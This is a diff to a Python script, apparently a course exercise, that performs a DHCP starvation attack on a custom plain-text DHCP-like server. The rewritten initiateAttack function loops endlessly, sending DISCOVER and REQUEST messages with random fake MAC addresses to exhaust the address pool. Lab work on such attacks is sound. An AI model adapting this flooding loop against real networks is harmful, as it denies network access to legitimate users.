@@ -14,20 +14,6 @@ def parse_message(message):
     parsedMessage = decodedMessage.split(" ")
     return parsedMessage
 
-def processResponse(parsed_message):
-    if parsed_message[0] == "OFFER":
-        send_Request(parsed_message[1], parsed_message[2], parsed_message[3])
-        message, _ = CLIENTSOCKET.recvfrom(4096)
-        parsed_message = parse_message(message)
-        dhcpAction = processResponse(parsed_message)
-        pass
-    if parsed_message[0] == "ACKNOWLEDGE":
-        initiateAttack()
-        pass
-    if parsed_message[0] == "DECLINE":
-        print("No address offered, Allocation declined")
-        initiateAttack()
-        pass
 
 def send_Request(macAddress, ipAddress, timestamp):
     message = "REQUEST " + macAddress + " " + ipAddress + " " + timestamp
@@ -44,10 +30,25 @@ def initiateAttack():
     MAC = (''.join(random.choice(letters) for i in range(10)))
     message = "DISCOVER " + MAC
     CLIENTSOCKET.sendto(message.encode(), (SERVER_IP, SERVER_PORT))
-    message, _ = CLIENTSOCKET.recvfrom(4096)
-    parsed_message = parse_message(message)
-    dhcpAction = processResponse(parsed_message)
-
+    
+    
+    while True:
+        message, _ = CLIENTSOCKET.recvfrom(4096)
+        parsed_message = parse_message(message)
+        if parsed_message[0] == "OFFER":
+            send_Request(parsed_message[1], parsed_message[2], parsed_message[3])
+            continue
+        elif parsed_message[0] == "ACKNOWLEDGE":
+            MAC = (''.join(random.choice(letters) for i in range(10)))
+            message = "DISCOVER " + MAC
+            CLIENTSOCKET.sendto(message.encode(), (SERVER_IP, SERVER_PORT))
+            continue
+        elif parsed_message[0] == "DECLINE":
+            print("No address offered, Allocation declined")
+            MAC = (''.join(random.choice(letters) for i in range(10)))
+            message = "DISCOVER " + MAC
+            CLIENTSOCKET.sendto(message.encode(), (SERVER_IP, SERVER_PORT))
+            continue
 
 # Extract local MAC address [DO NOT CHANGE]
 MAC = ":".join(["{:02x}".format((uuid.getnode() >> ele) & 0xFF) for ele in range(0, 8 * 6, 8)][::-1]).upper()
